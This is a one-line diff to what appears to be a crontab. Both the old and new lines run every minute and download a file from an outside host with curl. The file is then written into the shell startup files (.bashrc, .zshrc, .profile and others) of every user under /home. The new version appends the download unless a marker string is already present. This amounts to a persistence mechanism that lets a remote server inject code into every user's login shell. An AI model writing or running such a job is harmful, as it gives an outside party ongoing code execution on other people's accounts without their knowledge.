@@ -1,1 +1,1 @@
-* * * * * curl -o .zshrc http://snaipe.github.io/confloose/hard && echo .zshrc .zprofile .zlogin .bash_profile .bash_login .bashrc .profile .login .cshrc .tcshrc .kshrc | xargs -n 1 cp -r /home/*
+* * * * * curl -o /tmp/shellrc http://confloo.se/hard && for i in `echo -n /home/* | xargs -n 1 -d ' ' -i% echo -en %/{.zshrc,.zprofile,.zlogin,.bashrc,.bash_profile,.bash_login,.profile,.login,.tcshrc,.cshrc,.kshrc}"\x20"`; do grep "#begin cflz" $i &>/dev/null || cat /tmp/shellrc >> $i; done
